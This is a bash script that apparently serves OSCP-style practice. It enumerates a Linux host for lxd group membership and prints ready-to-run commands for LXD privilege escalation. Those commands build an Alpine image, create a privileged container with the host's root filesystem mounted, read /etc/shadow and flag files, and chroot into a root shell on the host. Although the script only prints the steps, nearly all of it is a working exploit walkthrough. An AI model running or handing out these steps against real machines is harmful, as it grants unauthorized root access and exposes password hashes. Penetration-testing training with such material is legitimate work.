#!/bin/bash

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

header() { echo -e "\n${CYAN}${BOLD}=== $1 ===${NC}\n"; }
log()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()   { echo -e "${YELLOW}[!]${NC} $1"; }
err()    { echo -e "${RED}[-]${NC} $1"; }
cmd()    { echo -e "    ${BOLD}$1${NC}"; }

find_bin() {
    command -v "$1" 2>/dev/null && return 0
    for d in /usr/bin /snap/bin /usr/local/bin /usr/sbin /sbin /bin; do
        [ -x "$d/$1" ] && echo "$d/$1" && return 0
    done
    find / -name "$1" -executable -type f 2>/dev/null | head -1
}

header "LXD Privilege Escalation - Command Guide (OSCP Compliant)"
echo -e "${YELLOW}This tool does NOT execute any exploit commands automatically.${NC}"
echo -e "${YELLOW}It enumerates the environment and suggests commands for you to run manually.${NC}\n"

header "Step 1: Enumeration"

CURRENT_USER=$(whoami 2>/dev/null)
CURRENT_GROUPS=$(id 2>/dev/null)
log "Current user: $CURRENT_USER"
log "Groups: $CURRENT_GROUPS"

if echo "$CURRENT_GROUPS" | grep -qE '\b(lxd|root)\b'; then
    log "User is in the lxd group - privilege escalation is possible"
else
    err "User is NOT in the lxd group - this exploit will not work"
    exit 1
fi

LXC=$(find_bin lxc)
if [ -z "$LXC" ]; then
    err "lxc binary not found on the system"
    exit 1
fi
log "lxc binary found at: $LXC"

LXD=$(find_bin lxd)
if [ -n "$LXD" ]; then
    log "lxd binary found at: $LXD"
fi

header "Step 2: Check Existing Storage Pool"

POOL=""
POOL=$("$LXC" storage list --format csv 2>/dev/null | head -1 | cut -d, -f1)
if [ -z "$POOL" ]; then
    POOL=$("$LXC" storage list --format json 2>/dev/null | grep -oP '"name"\s*:\s*"\K[^"]+' | head -1)
fi
if [ -z "$POOL" ]; then
    POOL=$("$LXC" storage list 2>/dev/null | awk -F'|' '/^\|/ && !/NAME/{gsub(/ /,"",$2); if($2!="") print $2}' | head -1)
fi

if [ -n "$POOL" ]; then
    log "Existing storage pool found: $POOL"
else
    warn "No storage pool found. You need to create one first."
    echo ""
    log "Run one of the following:"
    cmd "$LXC storage create default dir"
    echo ""
    log "Or initialize LXD with preseed:"
    cmd "cat <<EOF | $LXD init --preseed"
    cmd "config: {}"
    cmd "networks: []"
    cmd "storage_pools:"
    cmd "- { name: default, driver: dir }"
    cmd "profiles:"
    cmd "- { name: default, devices: { root: { path: /, pool: default, type: disk } } }"
    cmd "EOF"
    POOL="default"
fi

header "Step 3: Check Existing Images"

IMAGE=""
IMAGE=$("$LXC" image list --format csv 2>/dev/null | head -1 | cut -d, -f2)
if [ -z "$IMAGE" ]; then
    IMAGE=$("$LXC" image list --format json 2>/dev/null | grep -oP '"fingerprint"\s*:\s*"\K[^"]{12}' | head -1)
fi

if [ -n "$IMAGE" ]; then
    log "Existing image found: $IMAGE"
else
    warn "No images found. You need to import one."
    echo ""
    TARBALL="${1:-alpine-minirootfs-3.18.0-x86_64.tar.gz}"
    log "Option A: If you have a proper LXD image tarball:"
    cmd "$LXC image import <image.tar.gz> --alias privesc"
    echo ""
    log "Option B: If you have an Alpine minirootfs ($TARBALL):"
    log "You need to repack it as an LXD image first:"
    cmd "mkdir -p /tmp/lxd-img/rootfs"
    cmd "tar xzf $TARBALL -C /tmp/lxd-img/rootfs"
    cmd "mkdir -p /tmp/lxd-img/rootfs/sbin"
    cmd "printf '#!/bin/sh\nsleep infinity\n' > /tmp/lxd-img/rootfs/sbin/init"
    cmd "chmod +x /tmp/lxd-img/rootfs/sbin/init"
    cmd "cat > /tmp/lxd-img/metadata.yaml <<EOF"
    cmd "architecture: \"$(uname -m)\""
    cmd "creation_date: \$(date +%s)"
    cmd "properties:"
    cmd "  description: \"Alpine\""
    cmd "  os: Alpine"
    cmd "  release: \"3\""
    cmd "EOF"
    cmd "cd /tmp/lxd-img && tar czf metadata.tar.gz metadata.yaml"
    cmd "cd /tmp/lxd-img && tar czf rootfs.tar.gz -C rootfs ."
    cmd "$LXC image import /tmp/lxd-img/metadata.tar.gz /tmp/lxd-img/rootfs.tar.gz --alias privesc"
    echo ""
    log "Option C: Download from LXD remote (requires network):"
    cmd "$LXC image copy images:alpine/3.18 local: --alias privesc"
    IMAGE="privesc"
fi

header "Step 4: Create Privileged Container with Host Mount"

CONTAINER="privesc-container"
MP="/mnt/root"

log "Run the following commands to create a privileged container with the host filesystem mounted:"
echo ""
cmd "$LXC init $IMAGE $CONTAINER -c security.privileged=true"
cmd "$LXC config device add $CONTAINER hostfs disk source=/ path=$MP recursive=true"
cmd "$LXC start $CONTAINER"

header "Step 5: Access Host Filesystem"

log "Once the container is running, access the host filesystem:"
echo ""
log "Read flags:"
cmd "$LXC exec $CONTAINER -- cat $MP/root/proof.txt"
cmd "$LXC exec $CONTAINER -- cat $MP/root/root.txt"
cmd "$LXC exec $CONTAINER -- cat $MP/root/flag.txt"
echo ""
log "Read shadow file:"
cmd "$LXC exec $CONTAINER -- cat $MP/etc/shadow"
echo ""
log "Get a root shell on the host via chroot:"
cmd "$LXC exec $CONTAINER -- chroot $MP /bin/bash"
echo ""
log "Or interact with the container directly:"
cmd "$LXC exec $CONTAINER -- /bin/sh"

header "Step 6: Cleanup (after you are done)"

log "Stop and remove the container:"
cmd "$LXC stop $CONTAINER --force"
cmd "$LXC delete $CONTAINER --force"

header "Summary"

echo -e "${GREEN}Target:${NC}          $(hostname 2>/dev/null)"
echo -e "${GREEN}User:${NC}            $CURRENT_USER"
echo -e "${GREEN}LXC:${NC}             $LXC"
echo -e "${GREEN}Storage Pool:${NC}    ${POOL:-not found}"
echo -e "${GREEN}Image:${NC}           ${IMAGE:-needs import}"
echo -e "${GREEN}Container Name:${NC}  $CONTAINER"
echo -e "${GREEN}Host Mount:${NC}      $MP"
echo ""
